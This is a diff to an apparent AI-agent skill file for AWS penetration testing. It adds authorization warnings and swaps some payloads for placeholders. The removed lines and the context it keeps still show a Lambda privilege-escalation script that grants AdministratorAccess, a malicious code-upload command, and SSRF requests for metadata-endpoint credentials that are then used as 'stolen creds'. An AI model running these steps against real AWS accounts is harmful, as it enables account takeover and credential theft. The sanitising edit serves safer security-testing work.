@@ -1,11 +1,17 @@
 ---
 name: aws-penetration-testing
 description: "Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations."
-risk: unknown
-source: community
+metadata:
+  risk: offensive
+  source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
+
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
 
 # AWS Penetration Testing
 
@@ -15,6 +21,7 @@ Provide comprehensive techniques for penetration testing AWS cloud environments.
 
 ## Inputs/Prerequisites
 
+- **Mandatory User Confirmation:** Ask the user to verify the target URL/IP before running any commands.
 - AWS CLI configured with credentials
 - Valid AWS credentials (even low-privilege)
 - Understanding of AWS IAM model
@@ -177,21 +184,12 @@ aws iam put-user-policy --user-name my_username \
 
 ```python
 # code.py - Inject into Lambda function
-import boto3
-
-def lambda_handler(event, context):
-    client = boto3.client('iam')
-    response = client.attach_user_policy(
-        UserName='my_username',
-        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
-    )
-    return response
+# [SAFE-PAYLOAD] Simulate Lambda privilege escalation...
 ```
 
 ```bash
 # Update Lambda code
-aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
+# [SAFE-PAYLOAD] aws lambda update-function-code...
 ```
 
 ---
@@ -372,11 +370,11 @@ aws cloudtrail update-trail --name trail_name \
 
 ```bash
 # 1. Find SSRF vulnerability in web app
-https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+https://[SAFE-PAYLOAD]/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 # 2. Get role name from response
 # 3. Extract credentials
-https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
+https://[SAFE-PAYLOAD]/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
 
 # 4. Configure AWS CLI with stolen creds
 export AWS_ACCESS_KEY_ID=ASIA...
